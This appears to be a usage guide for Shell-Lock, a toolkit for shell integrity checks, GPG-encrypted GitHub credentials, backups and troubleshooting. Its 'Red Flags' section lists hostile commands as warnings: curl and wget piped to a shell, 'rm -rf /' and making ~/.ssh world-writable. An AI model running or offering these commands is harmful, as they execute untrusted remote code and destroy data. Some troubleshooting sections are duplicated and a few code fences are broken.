# 🔧 Shell-Lock Complete Usage Guide

This comprehensive guide covers all usage scenarios, security best practices, and protection against social engineering attacks for Shell-Lock users.

## 📚 Table of Contents

- [Quick Start Commands](#quick-start-commands)
- [Tested Environment Requirements](#tested-environment-requirements)
- [Security-First Operations](#security-first-operations)
- [Managing Integrity Warnings](#managing-integrity-warnings)
- [Secure Credential Management](#secure-credential-management)
- [GitHub Authentication (Secure Method)](#github-authentication-secure-method)
- [Backup and Recovery](#backup-and-recovery)
- [Social Engineering Protection](#social-engineering-protection)
- [WSL-Specific Guidance](#wsl-specific-guidance)
- [Emergency Procedures](#emergency-procedures)
- [Troubleshooting](#troubleshooting)
- [Frequently Asked Questions](#frequently-asked-questions)

## 🚀 Quick Start Commands

### Essential Daily Commands

```bash
# Security audit (run daily)
shell-lock audit

# Create secure backups before system changes
shell-lock backup-all

# Emergency clean shell (if compromised)
shell-lock emergency

# Show all available commands
shell-lock help
```

### Credential Management (Secure)

```bash
# Store GitHub token securely (encrypted with GPG)
secure-cred set github <username> <token>

# Login using encrypted credentials
gh-secure auth login <username>

# Use GitHub CLI securely (all commands work)
gh-secure repo list
gh-secure issue create
gh-secure pr create
```

## 🔧 Tested Environment Requirements

## 🔧 Tested Environment Requirements

### ✅ Confirmed Testing

**Shell-Lock has been tested on:**

- **WSL2** (Windows Subsystem for Linux 2)
- **Ubuntu** (tested versions available to project)

### 🔄 Community Testing Welcome

**We welcome community testing and feedback for:**

- **macOS** - Community feedback appreciated
- **Other Linux distributions** - Community verification helpful
- **BSD systems** - Community testing needed

### ❌ Known Incompatible Platforms

- **Windows PowerShell/CMD** - Use WSL2 instead
- **Alpine Linux** - Different shell behavior, compatibility unknown

### Shell Compatibility

```bash
# Supported shells
Zsh (Z shell)      - ✅ Primary target with features
Bash (Bourne Again SHell) - ✅ Compatibility support
POSIX shells       - ✅ Profile-based protection

# Verify your shell
echo $SHELL
```

## 🛡️ Security-First Operations

### Before You Start - Security Checklist

**⚠️ CRITICAL: Complete these security checks before using Shell-Lock:**

1. **Verify Prerequisites Installation**

   ```bash
   # Check all required tools are installed
   for tool in gpg ssh git sha256sum; do
       if command -v "$tool" >/dev/null 2>&1; then
           echo "✅ $tool installed"
       else
           echo "❌ $tool MISSING - install from official repos only"
       fi
   done
   ```

2. **Verify Repository Authenticity**

   ```bash
   # Check you're in the correct directory
   pwd  # Should be ~/dev/shell-lock or similar

   # Verify git remote (should be official repository)
   git remote -v

   # Check for suspicious files
   find . -type f -name "*.sh" -exec head -5 {} \;
   ```

3. **Test in Isolated Environment First**
   ```bash
   # Create test user or use container for initial testing
   # Never test on production systems first
   ```

### Initial Secure Setup

```bash
# Step 1: Run installation (review what it does)
./install.sh 2>&1 | tee install.log

# Step 2: Verify installation
shell-lock help

# Step 3: Run guided setup
shell-lock setup

# Step 4: Create initial backups
shell-lock backup-all

# Step 5: Run security baseline
shell-lock audit
```

## ⚠️ Managing Integrity Warnings

### The Problem

Shell-Lock monitors your configuration files for tampering. When you make **legitimate** changes, you'll see warnings like:

```
⚠️  SECURITY WARNING: Critical files have been modified since last check
```

### The Solution: Update the Integrity Baseline

**After making legitimate changes to your shell configs:**

```bash
# Method 1: Quick reset (recommended)
rm ~/.local/share/file-integrity.txt && security-check

# Method 2: Via shell-lock command
rm ~/.local/share/file-integrity.txt && shell-lock audit
```

### When to Update the Baseline

✅ **Update after these legitimate changes:**

- Editing `.zshrc`, `.bashrc`, or other shell configs
- Installing new scripts to `~/.local/bin/`
- Modifying SSH configurations
- Adding new shell aliases or functions

❌ **Don't ignore warnings for:**

- Unexpected file modifications
- Changes you didn't make
- Modifications to SSH keys or critical scripts

### Check What Changed Before Resetting

```bash
# See exactly what files changed
diff ~/.local/share/file-integrity.txt <(find ~/.local/bin ~/.ssh -type f -exec sha256sum {} \; 2>/dev/null; for file in ~/.zshrc ~/.bashrc ~/.profile ~/.zshenv ~/.zprofile ~/.bash_profile ~/.bash_login; do if [ -f "$file" ]; then sha256sum "$file" 2>/dev/null; fi; done)
```

## 🔧 Configuration Management

### Using Templates vs. Existing Configs

**Option 1: Keep your existing configs (recommended)**

```bash
# Shell-Lock integrates with your existing setup
shell-lock setup
# Choose 'N' when asked about templates
# Manually add security features as needed
```

**Option 2: Use Shell-Lock templates**

```bash
# Replaces your configs with secure templates
shell-lock setup
# Choose 'Y' when asked about templates
# Your old configs are backed up automatically
```

### Restoring Configurations

```bash
# Restore specific shell
shell-lock restore-zsh
shell-lock restore-bash

# Restore from specific backup
cp ~/.zshrc.backup.YYYYMMDD_HHMMSS ~/.zshrc

# Restore from secure backup system
secure-recovery restore-zsh
```

### Integration with Existing Shells

If you get errors like "no such file .local/bin/dev-startup", you need to fix the shell integration:

```bash
# Run the automatic patcher
./scripts/fix-shell-startup

# Or manually edit your .zshrc/.bashrc to change:
# source <(~/.local/bin/dev-startup)
# To:
# source "$HOME/.local/bin/dev-startup"
```

## 💾 Backup and Recovery

### Creating Backups

```bash
# Create secure backups of all shell configs
shell-lock backup-all

# Create backup of specific config
secure-recovery backup-zsh
secure-recovery backup-bash
```

### Verifying Backups

```bash
# Verify all backup integrity
shell-lock verify

# Check specific backup
secure-recovery verify
```

### Emergency Recovery

```bash
# Clean emergency shell (if things go wrong)
shell-lock emergency

# Emergency shell with minimal environment
/usr/bin/env -i HOME="$HOME" USER="$USER" PATH="/usr/local/bin:/usr/bin:/bin" TERM="$TERM" /bin/bash --norc --noprofile
```

## 🔐 GitHub Authentication

### Complete Secure Setup (Recommended)

**Step 1: Remove any existing plaintext tokens**

```bash
# Logout from standard GitHub CLI (removes plaintext storage)
gh auth logout

# Verify plaintext tokens are gone
cat ~/.config/gh/hosts.yml  # Should be empty: {}
```

**Step 2: Set up GPG for encrypted credential storage**

```bash
# Generate GPG key if you don't have one
gpg --full-generate-key
# Choose: (9) ECC and ECC, never expires, strong passphrase

# Fix GPG TTY for terminal use
export GPG_TTY=$(tty)
```

**Step 3: Store GitHub token securely**

```bash
# Get a Personal Access Token from GitHub Settings > Developer settings
# Store it encrypted (will prompt for GPG passphrase)
gh-secure auth set your-username your_github_token

# Login using encrypted storage (will prompt for GPG passphrase)
gh-secure auth login your-username
```

### Using GitHub CLI Securely

```bash
# All standard gh commands work through gh-secure
gh-secure repo list
gh-secure pr create --title "My PR"
gh-secure issue list

# Check authentication status
gh-secure auth status

# List stored credentials
secure-cred list
```

### SSH + Token Hybrid Approach

For maximum security, use SSH for git operations and encrypted tokens for CLI:

```bash
# Configure git to use SSH for all GitHub operations
git config --global url."git@github.com:".insteadOf "https://github.com/"

# SSH operations (no tokens needed)
git clone git@github.com:user/repo.git
git push  # Uses SSH keys

# CLI operations (uses encrypted tokens)
gh-secure pr create
gh-secure issue list
```

## 🐛 Troubleshooting

### Shell Startup Errors

**Problem:** `bad pattern: ^[[0` or `/proc/self/fd/13:1: bad pattern: ^[[0`

**Solution:**

```bash
# Run the automatic fix
./scripts/fix-shell-startup

# Update integrity baseline
rm ~/.local/share/file-integrity.txt && security-check
```

### Permission Errors

**Problem:** Permission denied errors

**Solution:**

```bash
# Fix script permissions
chmod +x ~/.local/bin/shell-lock
chmod +x ~/.local/bin/secure-*
chmod +x ~/.local/bin/security-check

# Fix directory permissions
chmod 700 ~/.local/share/secure-backups
chmod 700 ~/.config/shell-lock
```

### GitHub SSH Authentication Failures

**Problem:** `GitHub SSH authentication failed` or SSH config errors like:

```
/home/user/.ssh/config: line 43: Bad configuration option: usekeychain
```

**Cause:** macOS-specific SSH options in config that don't work on Linux/WSL

**Solution:**

```bash
# Remove or comment out macOS-specific options
sed -i 's/UseKeychain yes/# UseKeychain yes  # macOS only/' ~/.ssh/config
sed -i '/usekeychain/d' ~/.ssh/config

# Test SSH connection
ssh -T git@github.com

# Should show: "Hi <username>! You've successfully authenticated"
```

**If you still have issues:**

```bash
# Check if you have SSH keys
ls -la ~/.ssh/ | grep -E "(id_|github)"

# Generate new SSH key if needed
ssh-keygen -t ed25519 -C "your_email@example.com"

# Add to GitHub
gh ssh-key add ~/.ssh/id_ed25519.pub
```

### PATH Issues

**Problem:** `shell-lock: command not found`

**Solution:**

```bash
# Check if ~/.local/bin is in PATH
echo $PATH | grep -q "$HOME/.local/bin" && echo "✅ PATH OK" || echo "❌ Add ~/.local/bin to PATH"

# Add to PATH (add to your .zshrc/.bashrc)
export PATH="$HOME/.local/bin:$PATH"
```

### GPG Issues

**Problem:** GPG encryption/decryption failures or "inappropriate ioctl for device"

**Solution:**

```bash
# Fix GPG TTY issues
export GPG_TTY=$(tty)

# Test GPG setup
echo "test" | gpg --symmetric --cipher-algo AES256 | gpg --decrypt

# If GPG isn't set up, generate a key:
gpg --full-generate-key
# Choose: (9) ECC and ECC, Curve 25519, never expires
# Use a strong passphrase you'll remember
```

**For secure credential storage:**

```bash
# Store GitHub token (will prompt for GPG passphrase)
secure-cred set github username your_token_here

# Retrieve token (will prompt for GPG passphrase)
secure-cred get github username
```

### Authentication Prompt Issues

**Problem:** "bad substitution" error when typing 'y' for authentication

**Cause:** bash-specific parameter expansion `${var,,}` doesn't work in zsh

**Solution:** This has been fixed in the latest version. The prompt now:

- Shows `(y/N)` to indicate 'N' is default
- Accepts `y`, `Y`, `yes`, `YES`, `Yes`
- Uses portable shell scripting (works in both bash and zsh)

## ❓ FAQ

### Q: How often should I run security audits?

**A:** Run `shell-lock audit` daily or after any system changes. Consider adding it to your shell startup.

### Q: Is it safe to ignore integrity warnings?

**A:** Never ignore them! Either update the baseline (if you made the changes) or investigate (if you didn't).

### Q: Can I use Shell-Lock with Oh My Zsh/other frameworks?

**A:** Yes! Shell-Lock is designed to work alongside existing shell frameworks. Choose "keep existing configs" during setup.

### Q: What if I lose my GPG key?

**A:** Your encrypted credentials will be unrecoverable. Always backup your GPG keys separately. Shell-Lock focuses on protecting credentials, not replacing proper key management.

### Q: How do I completely remove Shell-Lock?

**A:**

```bash
# Remove scripts
rm -f ~/.local/bin/shell-lock ~/.local/bin/secure-* ~/.local/bin/security-check ~/.local/bin/dev-startup

# Remove configs (optional)
rm -rf ~/.config/shell-lock

# Remove shell integration (manual edit of .zshrc/.bashrc)
# Remove or comment out the dev-startup lines
```

### Q: Can I customize the security checks?

**A:** Yes, edit `~/.local/bin/security-check` to add/remove checks. Remember to update the integrity baseline afterward.

### Q: Does Shell-Lock work in CI/CD environments?

**A:** Shell-Lock is designed for interactive development environments. For CI/CD, use dedicated secret management solutions.

### Q: How do I migrate between machines?

**A:**

```bash
# Export configuration
tar -czf shell-lock-backup.tar.gz ~/.config/shell-lock ~/.local/share/secure-backups

# On new machine: install Shell-Lock, then:
tar -xzf shell-lock-backup.tar.gz -C ~/
```

## 📝 Common Workflows

### Daily Development Workflow

```bash
# Morning: Check security status
shell-lock audit

# During work: Use secure GitHub CLI
gh-secure pr list
gh-secure repo clone user/repo

# After config changes: Update baseline
rm ~/.local/share/file-integrity.txt && shell-lock audit
```

### Weekly Maintenance

```bash
# Create fresh backups
shell-lock backup-all

# Verify backup integrity
shell-lock verify

# Review security logs
# Review security logs
tail -20 ~/.local/share/security-check.log
```

## 🔧 Common Troubleshooting Issues

### GitHub SSH Authentication Fails

**Problem:** `❌ GitHub SSH authentication failed` or SSH config errors like:

```text
/home/user/.ssh/config: line XX: Bad configuration option: usekeychain
```

**Solution:** Remove macOS-specific SSH options from your config:

```bash
# Fix macOS-specific SSH options on Linux/WSL
sed -i 's/UseKeychain yes/# UseKeychain yes  # macOS only/' ~/.ssh/config

# Test GitHub SSH connection
ssh -T git@github.com
```

**Common SSH Config Issues:**

- `UseKeychain` - macOS only, remove on Linux/WSL
- `AddKeysToAgent yes` - Should work on all platforms
- Missing `IdentityFile` path to your GitHub SSH key

### Shell Startup Hangs or Fails

**Problem:** Shell startup gets stuck or shows "bad pattern" errors.

**Solution:**

```bash
# Emergency shell access
/bin/bash --norc

# Fix ANSI pattern issues
~/dev/shell-lock/scripts/fix-shell-startup

# Reset integrity baseline
rm ~/.local/share/file-integrity.txt && security-check
```

### Authentication Prompt Issues

**Problem:** `bad substitution` error when answering authentication prompt.

**Solution:** This was fixed in recent versions. Ensure you have the latest:

```bash
# Reinstall latest scripts
cd ~/dev/shell-lock
cp scripts/dev-startup ~/.local/bin/dev-startup
chmod +x ~/.local/bin/dev-startup
```

### Troubleshooting Workflow

```

## 🔧 Common Troubleshooting Issues

### GitHub SSH Authentication Fails

**Problem:** `❌ GitHub SSH authentication failed` or SSH config errors like:

```

/home/user/.ssh/config: line XX: Bad configuration option: usekeychain

````

**Solution:** Remove macOS-specific SSH options from your config:

```bash
# Fix macOS-specific SSH options on Linux/WSL
sed -i 's/UseKeychain yes/# UseKeychain yes  # macOS only/' ~/.ssh/config

# Test GitHub SSH connection
ssh -T git@github.com
````

**Common SSH Config Issues:**

- `UseKeychain` - macOS only, remove on Linux/WSL
- `AddKeysToAgent yes` - Should work on all platforms
- Missing `IdentityFile` path to your GitHub SSH key

### Shell Startup Hangs or Fails

**Problem:** Shell startup gets stuck or shows "bad pattern" errors.

**Solution:**

```bash
# Emergency shell access
/bin/bash --norc

# Fix ANSI pattern issues
~/dev/shell-lock/scripts/fix-shell-startup

# Reset integrity baseline
rm ~/.local/share/file-integrity.txt && security-check
```

### Authentication Prompt Issues

**Problem:** `bad substitution` error when answering authentication prompt.

**Solution:** This was fixed in recent versions. Ensure you have the latest:

```bash
# Reinstall latest scripts
cd ~/dev/shell-lock
cp scripts/dev-startup ~/.local/bin/dev-startup
chmod +x ~/.local/bin/dev-startup
```

### Troubleshooting Workflow

```bash
# If shell startup fails:
shell-lock emergency

# Fix the issue in emergency shell
./scripts/fix-shell-startup

# Update integrity and test
rm ~/.local/share/file-integrity.txt && security-check
zsh -c "echo 'Test startup'"
```

## 🛡️ Social Engineering Protection

### Understanding Social Engineering Threats

**Social engineering attacks target the human element rather than technical vulnerabilities.** In development environments, these attacks often involve:

- **Malicious "helper" scripts** disguised as productivity tools
- **Fake security updates** that actually compromise systems
- **Credential harvesting** through seemingly legitimate tools
- **Supply chain attacks** via compromised dependencies
- **"Quick fixes"** for common problems that contain backdoors

### 🚨 Red Flags - Never Trust These

**Immediate red flags that indicate potential social engineering:**

```bash
# NEVER run commands like these from untrusted sources:
curl http://example.com/script.sh | bash     # Pipe to shell
wget -qO- http://example.com/setup | sh      # Download and execute
bash <(curl -s http://example.com/install)   # Download and execute
sudo rm -rf / --no-preserve-root             # Destructive commands
chmod 777 ~/.ssh/                            # Dangerous permissions
```

**Common social engineering phrases to watch for:**

- "Quick fix for your problem"
- "Just run this one command"
- "This will solve all your issues"
- "Don't worry about what it does"
- "Everyone uses this script"

### ✅ Shell-Lock Protection Features

**How Shell-Lock protects against social engineering:**

1. **Input Validation** - All inputs sanitized and validated
2. **Secure Defaults** - Most secure settings used by default
3. **Transparency** - All scripts are readable and auditable
4. **User Education** - Clear warnings about security implications

### Safe Verification Practices

```bash
# Always verify script contents before running
head -20 install.sh
cat scripts/secure-cred | less

# Check repository authenticity
git remote -v  # Should be official Shell-Lock repository

# Test in isolation first
# Use containers or test accounts for initial testing
```

## 🔧 WSL-Specific Guidance

### WSL2 Security Features

**Shell-Lock automatically detects and optimizes for WSL environments:**

```bash
# Check if running in WSL
echo $WSL_DISTRO_NAME  # Shows WSL distribution name if in WSL

# WSL-specific security checks are enabled automatically
shell-lock audit  # Includes WSL-aware monitoring
```

### WSL Security Best Practices

1. **Separate Windows and Linux credentials**
2. **Monitor cross-platform file access**
3. **Be cautious of shared network services**
4. **Keep Windows and Linux tools separate**

## 🚨 Emergency Procedures

### If Your System is Compromised

**Immediate Actions:**

```bash
# 1. Get to clean emergency shell
shell-lock emergency

# 2. Run security assessment
shell-lock audit > /tmp/security-report.txt

# 3. Check backup integrity
shell-lock verify

# 4. Restore if needed
shell-lock restore-all
```

### Recovery Steps

1. **Revoke all credentials** using a different secure device
2. **Restore from verified backups** using `shell-lock restore-all`
3. **Update security baseline** with `rm ~/.local/share/file-integrity.txt && shell-lock audit`
4. **Enhance monitoring** for suspicious activity

---

**💡 Remember:** Shell-Lock is designed to protect you, not get in your way. When you see warnings, it means the system is working correctly and detected changes that need your attention.

## Important Disclaimers

**Testing and Compatibility:**

- **Limited Testing**: This software has been tested only on WSL2 and Ubuntu environments
- **No Guarantees**: We make no claims about safety, security, or functionality on other systems
- **User Responsibility**: You must understand each feature and test in your environment

**Security Limitations:**

- **No Security Guarantees**: This toolkit provides features but cannot guarantee protection against all threats
- **Proper Configuration Required**: Security depends on proper understanding and configuration
- **Regular Maintenance**: Security requires ongoing monitoring and updates

For more detailed information, see:

- `~/.config/shell-lock/docs/SECURITY_GUIDE.md` - Detailed security features
- `~/.config/shell-lock/docs/RECOVERY_GUIDE.md` - Recovery procedures
- `shell-lock help` - Quick command reference
